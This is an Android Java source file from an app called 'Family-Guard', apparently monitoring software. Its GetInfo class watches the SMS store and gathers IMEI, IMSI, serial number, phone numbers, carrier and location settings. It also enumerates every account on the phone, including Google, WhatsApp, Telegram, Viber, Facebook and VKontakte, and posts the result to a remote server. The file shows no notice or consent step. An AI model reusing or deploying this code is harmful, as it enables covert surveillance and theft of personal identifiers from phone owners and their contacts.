package com.inet.android.info;

import java.lang.reflect.Method;
import java.text.NumberFormat;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.os.Environment;
import android.os.Handler;
import android.os.StatFs;
import android.preference.PreferenceManager;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.DisplayMetrics;
import android.view.WindowManager;

import com.inet.android.request.DataRequest;
import com.inet.android.sms.SMSBroadcastReceiver;
import com.inet.android.sms.SmsSentObserver;
import com.inet.android.utils.ConvertDate;
import com.inet.android.utils.Logging;

public class GetInfo {
	static Context mContext;
	static SharedPreferences sp;
	static Editor e;
	static TelephonyManager telephonyManager;
	static int networkType;
	TelephonyInfo telephonyInfo;
	private String LOG_TAG = "GetIfo";
	String typeStr = "1";
	ConvertDate date;
	SMSBroadcastReceiver sms;
	JSONObject info;

	public GetInfo(Context mContext) {
		GetInfo.mContext = mContext;
	}

	public void startGetInfo() {
		date = new ConvertDate();
		SmsSentObserver observer = new SmsSentObserver(null);
		observer.setContext(mContext);
		mContext.getContentResolver().registerContentObserver(
				Uri.parse("content://sms"), true, observer);
		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
		telephonyManager = (TelephonyManager) mContext
				.getSystemService(Context.TELEPHONY_SERVICE);
		telephonyInfo = TelephonyInfo.getInstance(mContext);

		// -------initial json line----------------------
		String sendJSONStr = null;
		JSONObject jsonObject = new JSONObject();
		JSONArray data = new JSONArray();

		info = new JSONObject();
		JSONObject object = new JSONObject();
		try {
			info.put("Version Family-Guard", sp.getString("BUILD", "V_000.1"));
			info.put("Manufactured", getManufactured());
			info.put("Product", getProduct());
			info.put("Brand", getBrand());
			info.put("Model", getModel());
			info.put("os_version", getVerAndroid());
			info.put("SDK", getSDK());
			info.put("IMSI", getIMSI());
			info.put("Serial number", getSerialNum());
			getFeatures();
			info.put("Display size", getDisplayInfo());
			info.put("SD", getSDCardReady());
			info.put("Operator name", getOperatorName());
			info.put("Phone type", getPhoneType());
			info.put("Dual sim", getIsDualSIM());
			info.put("IMEI SIM", getIMEISim1());

			if (getIsDualSIM().equals("supported"))
				info.put("IMEI SIM2", getIMEISim2());
			if (getNumber() != null)
				info.put("Number", getNumber());
			// else if (getAccaunt() != null)
			// info.put("number", getAccaunt());

			info.put("MCC", getMCC());
			info.put("MNC", getMNC());
			info.put("Network type", getNetworkType());
			info.put("Network", getConnectType());
			getAccaunt();

			object.put("time", date.logTime());
			object.put("type", typeStr);
			object.put("info", info);
			data.put(object);
			jsonObject.put("data", data);
			sendJSONStr = object.toString();
		} catch (JSONException e) {
			Logging.doLog(LOG_TAG, "json ��������", "json ��������");
		}
		if (sendJSONStr != null) {
			DataRequest dr = new DataRequest(mContext);
			dr.sendRequest(object.toString());
			Logging.doLog(LOG_TAG, sendJSONStr);
		}
	}

	/**
	 * get getSimOperatorName
	 * 
	 * @return
	 */
	public String getSimOperatorName() {
		String operatorName;
		try {
			operatorName = telephonyManager.getSimOperatorName();
		} catch (Exception e) {
			e.printStackTrace();
			operatorName = "0";
		}
		return operatorName;
	}

	/**
	 * get getBrand
	 * 
	 * @return
	 */
	public String getBrand() {
		String brand;
		try {
			brand = android.os.Build.BRAND;
		} catch (Exception e) {
			e.printStackTrace();
			brand = "0";
		}
		return brand;
	}

	/**
	 * get getSDK
	 * 
	 * @return
	 */
	public String getSDK() {
		String SDK;
		try {
			SDK = Integer.toString(android.os.Build.VERSION.SDK_INT);
		} catch (Exception e) {
			e.printStackTrace();
			SDK = "0";
		}
		return SDK;
	}

	/**
	 * get getOperatorName
	 * 
	 * @return
	 */
	public String getOperatorName() {
		String operatorName = null;
		try {
			operatorName = telephonyManager.getNetworkOperatorName();
		} catch (Exception e) {
			e.printStackTrace();
			operatorName = "0";
		}
		return operatorName;
	}

	/**
	 * getIMEI
	 * 
	 * @return
	 */

	public String getIMEI() {
		String sIMEI = null;
		try {
			sIMEI = telephonyManager.getDeviceId();
		} catch (Exception e) {
			e.printStackTrace();
			sIMEI = "0";
		}
		return sIMEI;

	}

	/**
	 * getIMSI
	 * 
	 * @return
	 */

	public String getIMSI() {
		String sIMSI = null;
		try {
			sIMSI = telephonyManager.getSubscriberId();
		} catch (Exception e) {
			e.printStackTrace();
			sIMSI = "0";
		}
		return sIMSI;

	}

	/**
	 * getVersion Android
	 * 
	 * @return
	 */
	public String getVerAndroid() {
		String verAndroid = null;
		try {
			verAndroid = android.os.Build.VERSION.RELEASE;
		} catch (Exception e) {
			e.printStackTrace();
			verAndroid = "0";
		}
		return verAndroid;

	}

	/**
	 * getManufactured
	 * 
	 * @return
	 */

	public String getManufactured() {
		String manufactured = null;
		try {
			manufactured = android.os.Build.MANUFACTURER;
		} catch (Exception e) {
			e.printStackTrace();
			manufactured = "0";
		}
		return manufactured;

	}

	/**
	 * getProduct
	 * 
	 * @return
	 */
	public String getProduct() {
		String product = null;
		try {
			product = android.os.Build.PRODUCT;
		} catch (Exception e) {
			e.printStackTrace();
			product = "0";
		}
		return product;

	}

	/**
	 * getModel
	 * 
	 * @return
	 */
	public String getModel() {
		String model = null;
		try {
			model = android.os.Build.MODEL;
		} catch (Exception e) {
			e.printStackTrace();
			model = "0";
		}
		return model;

	}

	/**
	 * getSerialNumber
	 * 
	 * @return
	 */
	public String getSerialNum() {
		String serialnum = null;

		try {
			Class<?> c = Class.forName("android.os.SystemProperties");
			Method get = c.getMethod("get", String.class, String.class);
			serialnum = (String) (get.invoke(c, "ro.serialno", "unknown"));
		} catch (Exception e) {
			e.printStackTrace();
		}
		return serialnum;
	}

	/**
	 * get PhoneType
	 * 
	 * @return
	 */
	public String getPhoneType() {
		int phoneType = telephonyManager.getPhoneType();
		String phoneTypeName = null;
		switch (phoneType) {
		case (TelephonyManager.PHONE_TYPE_CDMA):
			phoneTypeName = "CDMA";
			break;
		case (TelephonyManager.PHONE_TYPE_GSM):
			phoneTypeName = "GSM";
			break;
		case (TelephonyManager.PHONE_TYPE_NONE):
			phoneTypeName = "NONE";
			break;
		default:
			break;
		}
		return phoneTypeName;
	}

	/**
	 * get NetworkType
	 * 
	 * @return
	 */
	public String getNetworkType() {
		networkType = telephonyManager.getNetworkType();
		switch (networkType) {
		case TelephonyManager.NETWORK_TYPE_1xRTT:
			return "1xRTT";
		case TelephonyManager.NETWORK_TYPE_CDMA:
			return "CDMA";
		case TelephonyManager.NETWORK_TYPE_EDGE:
			return "EDGE";
		case TelephonyManager.NETWORK_TYPE_EHRPD:
			return "eHRPD";
		case TelephonyManager.NETWORK_TYPE_EVDO_0:
			return "EVDO rev. 0";
		case TelephonyManager.NETWORK_TYPE_EVDO_A:
			return "EVDO rev. A";
		case TelephonyManager.NETWORK_TYPE_EVDO_B:
			return "EVDO rev. B";
		case TelephonyManager.NETWORK_TYPE_GPRS:
			return "GPRS";
		case TelephonyManager.NETWORK_TYPE_HSDPA:
			return "HSDPA";
		case TelephonyManager.NETWORK_TYPE_HSPA:
			return "HSPA";
		case TelephonyManager.NETWORK_TYPE_HSPAP:
			return "HSPA+";
		case TelephonyManager.NETWORK_TYPE_HSUPA:
			return "HSUPA";
		case TelephonyManager.NETWORK_TYPE_IDEN:
			return "iDen";
		case TelephonyManager.NETWORK_TYPE_LTE:
			return "LTE";
		case TelephonyManager.NETWORK_TYPE_UMTS:
			return "UMTS";
		case TelephonyManager.NETWORK_TYPE_UNKNOWN:
			return "0";
		}
		throw new RuntimeException("New type of network");
	}

	/**
	 * getConnectType
	 * 
	 * @return
	 */
	public String getConnectType() {

		String network = "";
		ConnectivityManager cm = (ConnectivityManager) mContext
				.getSystemService(Context.CONNECTIVITY_SERVICE);
		try {
			if (cm.getActiveNetworkInfo().getTypeName().equals("MOBILE"))
				network = "Cell Network/3G";
			else if (cm.getActiveNetworkInfo().getTypeName().equals("WIFI"))
				network = "WiFi";
			else
				network = "N/A";
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return network;
	}

	/**
	 * getIMEISim1
	 * 
	 * @return
	 */

	public String getIMEISim1() {
		String sIMEISim1 = null;
		try {
			sIMEISim1 = telephonyInfo.getImeiSIM1();
		} catch (Exception e) {
			e.printStackTrace();
			sIMEISim1 = "0";
		}
		return sIMEISim1;

	}

	/**
	 * getIMEISim2
	 * 
	 * @return
	 */

	public String getIMEISim2() {
		String sIMEISim2 = null;
		try {
			sIMEISim2 = telephonyInfo.getImeiSIM2();
		} catch (Exception e) {
			e.printStackTrace();
			sIMEISim2 = "0";
		}
		return sIMEISim2;
	}

	/**
	 * getIMEISim1Ready
	 * 
	 * @return
	 */
	public String getIsSIM1Ready() {
		String sIMEISim1Ready = null;
		try {
			sIMEISim1Ready = Boolean.toString(telephonyInfo.isSIM1Ready());

		} catch (Exception e) {
			e.printStackTrace();
			sIMEISim1Ready = "0";
		}
		return sIMEISim1Ready;

	}

	/**
	 * getIMEISim2Ready
	 * 
	 * @return
	 */
	public String getIsSIM2Ready() {
		String sIMEISim2Ready = null;
		try {
			sIMEISim2Ready = Boolean.toString(telephonyInfo.isSIM2Ready());
		} catch (Exception e) {
			e.printStackTrace();
			sIMEISim2Ready = "0";
		}
		return sIMEISim2Ready;

	}

	/**
	 * getIsDualSim
	 * 
	 * @return
	 */
	public String getIsDualSIM() {
		String sIsDualSim = null;
		try {
			sIsDualSim = telephonyInfo.isDualSIM();
		} catch (Exception e) {
			e.printStackTrace();
			sIsDualSim = "0";
		}
		return sIsDualSim;

	}

	/**
	 * getNumber
	 * 
	 * @return
	 */
	public String getNumber() {
		String number = null;
		try {
			number = telephonyInfo.getNumber();
		} catch (Exception e) {
			e.printStackTrace();
		}
		return number;

	}

	/**
	 * getAccaunt
	 * 
	 * 
	 */
	public void getAccaunt() {
		String accauntGoogle = null;

		AccountManager am = AccountManager.get(mContext);
		Account[] accounts = am.getAccounts();
		String phoneNumber = null;

		for (Account ac : accounts) {
			String acname = ac.name;
			String actype = ac.type;
			// Take your time to look at all available accounts
			System.out.println("Accounts : " + acname + ", " + actype);
			if (actype.equals("com.google")) {
				if (accauntGoogle == null)
					accauntGoogle = acname;
				else
					accauntGoogle += ", " + acname;
			} else if (actype.equals("com.whatsapp")) {

				if (!acname.matches("(?i).*[a-z�-�].*")) {
					String number = acname.replace(" ", "");
					if (number.indexOf("7") == 0) {
						number = "+" + number;
					}
					if (phoneNumber != null) {
						if (!phoneNumber.equals(number)) {
							phoneNumber = " " + number;
						}
					} else
						phoneNumber = number;

					try {
						info.put("WhatsApp", phoneNumber);
					} catch (JSONException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
			} else if (actype.equals("com.viber.voip.account")) {
				if (!acname.matches("(?i).*[a-z�-�].*")) {
					String number = acname.replace(" ", "");
					if (number.indexOf("7") == 0) {
						number = "+" + number;
					}
					if (phoneNumber != null) {
						if (!phoneNumber.equals(number)) {
							phoneNumber += " " + number;
						}
					} else
						phoneNumber = number;

					try {
						info.put("Viber", acname);
					} catch (JSONException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}

				}
			} else if (actype.equals("com.icq.mobile.client")) {
				if (!acname.matches("(?i).*[a-z�-�].*")) {
					String number = acname.replace(" ", "");
					if (number.indexOf("7") == 0) {
						number = "+" + number;
					}
					if (phoneNumber != null) {
						if (!phoneNumber.equals(number)) {
							phoneNumber += " " + number;
						}
					} else
						phoneNumber = number;

					try {
						info.put("ICQ", acname);
					} catch (JSONException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
			} else if (actype.equals("org.telegram.account")) {
				if (!acname.matches("(?i).*[a-z�-�].*")) {
					String number = acname.replace(" ", "");
					if (number.indexOf("7") == 0) {
						number = "+" + number;
					}

					if (phoneNumber != null) {
						if (!phoneNumber.equals(number)) {
							phoneNumber += " " + number;
						}
					} else
						phoneNumber = number;

					try {
						info.put("Telegram", acname);
					} catch (JSONException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
			} else if (actype.equals("com.skype.contacts.sync")) {
				try {
					info.put("Skype", acname);
				} catch (JSONException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			} else if (actype.equals("com.vkontakte.account")) {
				try {
					info.put("Vkontakte", acname);
				} catch (JSONException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			} else if (actype.equals("com.facebook.auth.login")) {
				try {
					info.put("Facebook", acname);
				} catch (JSONException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			} else {
				try {
					info.put(actype, acname);
				} catch (JSONException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		}
		try {
			if (accauntGoogle != null)
				info.put("Google", accauntGoogle);
			if (phoneNumber != null)
				info.put("Number", phoneNumber);
		} catch (JSONException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	/**
	 * getMCC
	 * 
	 * @return
	 */
	public String getMCC() {
		String networkOperator = telephonyManager.getNetworkOperator();
		String mcc = null;
		try {
			if (networkOperator != null) {
				mcc = networkOperator.substring(0, 3);

			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return mcc;

	}

	/**
	 * getMCC
	 * 
	 * @return
	 */
	public String getMNC() {
		String networkOperator = telephonyManager.getNetworkOperator();
		String mnc = null;
		try {
			if (networkOperator != null) {
				mnc = networkOperator.substring(3);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return mnc;

	}

	/**
	 * getDisplayMetrics w*h
	 * 
	 * @return
	 */
	public String getDisplayInfo() {
		WindowManager wm = (WindowManager) mContext
				.getSystemService(Context.WINDOW_SERVICE);
		// Best way for new devices
		DisplayMetrics displayMetrics = new DisplayMetrics();
		wm.getDefaultDisplay().getMetrics(displayMetrics);
		String str_ScreenSize = displayMetrics.widthPixels + " x "
				+ displayMetrics.heightPixels;
		return str_ScreenSize;
	}

	private String getSDCardReady() {
		String SD = null;
		StatFs stats;
		// the total size of the SD card
		double totalSize;
		// the available free space
		double freeSpace;
		// a String to store the SD card information
		String totalSpace;
		String RemainingSpace;

		// set the number format output
		NumberFormat numberFormat;

		if (Environment.getExternalStorageState().equals(
				Environment.MEDIA_MOUNTED))
			SD = "Mounted";
		else if (Environment.getExternalStorageState().equals(
				Environment.MEDIA_REMOVED))
			SD = "Removed";
		else if (Environment.getExternalStorageState().equals(
				Environment.MEDIA_CHECKING))
			SD = "Checking";
		else if (Environment.getExternalStorageState().equals(
				Environment.MEDIA_UNMOUNTED))
			SD = "Unmounted";
		else if (Environment.getExternalStorageState().equals(
				Environment.MEDIA_BAD_REMOVAL))
			SD = "Bad removal";
		else if (Environment.getExternalStorageState().equals(
				Environment.MEDIA_MOUNTED_READ_ONLY))
			SD = "Mounted read only";
		else if (Environment.getExternalStorageState().equals(
				Environment.MEDIA_NOFS))
			SD = "Unsupported filesystem";
		else if (Environment.getExternalStorageState().equals(
				Environment.MEDIA_SHARED))
			SD = "Shared";
		else if (Environment.getExternalStorageState().equals(
				Environment.MEDIA_UNMOUNTABLE))
			SD = "Cannot be mounted";
		if (SD.equals("Mounted") || SD.equals("Unmounted")
				|| SD.equals("Mounted read only")) {
			// obtain the stats from the root of the SD card.
			stats = new StatFs(Environment.getExternalStorageDirectory()
					.getAbsolutePath());

			// Add 'Total Size' to the output string:
			// total usable size
			totalSize = stats.getBlockCount() * stats.getBlockSize();

			// initialize the NumberFormat object
			numberFormat = NumberFormat.getInstance();
			// disable grouping
			numberFormat.setGroupingUsed(false);
			// display numbers with two decimal places
			numberFormat.setMaximumFractionDigits(2);

			// Output the SD card's total size in gigabytes, megabytes,
			// kilobytes and bytes 280
			totalSpace = numberFormat.format((totalSize / (double) 1073741824))
					+ " GB \n";

			// Add 'Remaining Space' to the output string:
			// available free space
			freeSpace = stats.getAvailableBlocks() * stats.getBlockSize();
			// freeSize = stats.getFreeBlocks()*stats.getBlockSize();
			// Output the SD card's available free space in gigabytes,
			// megabytes, kilobytes and bytes
			RemainingSpace = numberFormat
					.format((freeSpace / (double) 1073741824)) + " GB \n";
			try {
				info.put("Total Size", totalSpace);
				info.put("Removing Size", RemainingSpace);

			} catch (JSONException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		return SD;
	}

	private void getFeatures() {
		PackageManager pm = mContext.getPackageManager();
		String GPS;
		String LocationStatus;
		String USBHost;
		String WiFi;
		String microphone;
		String network;
		if (pm.hasSystemFeature(PackageManager.FEATURE_LOCATION_GPS) == true)
			GPS = "Available";
		else
			GPS = "Not available";
		if (pm.hasSystemFeature(PackageManager.FEATURE_LOCATION_NETWORK) == true)
			network = "Available";
		else
			network = "Not available";
		String provider = Settings.Secure.getString(
				mContext.getContentResolver(),
				Settings.Secure.LOCATION_PROVIDERS_ALLOWED);
		if (!provider.equals("")) {
			// GPS Enabled
			LocationStatus = provider;
		} else {
			LocationStatus = "";
		}
		if (pm.hasSystemFeature(PackageManager.FEATURE_USB_HOST) == true)
			USBHost = "Available";
		else
			USBHost = "Not available";
		if (pm.hasSystemFeature(PackageManager.FEATURE_WIFI) == true)
			WiFi = "Available";
		else
			WiFi = "Not available";
		if (pm.hasSystemFeature(PackageManager.FEATURE_MICROPHONE) == true)
			microphone = "Available";
		else
			microphone = "Not available";
		try {
			if (!LocationStatus.equals(""))
				info.put("GPS Status", LocationStatus);
			info.put("Available location", GPS);
			info.put("Location network", network);
			info.put("WiFi", WiFi);
			info.put("Microphone ", microphone);
			info.put("USBHost", USBHost);

		} catch (JSONException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	public void contentObserved() {
		SmsSentObserver smsSentObserver = new SmsSentObserver(new Handler(),
				mContext);
		mContext.getContentResolver().registerContentObserver(
				Uri.parse("content://sms/sent"), true, smsSentObserver);
	}
}
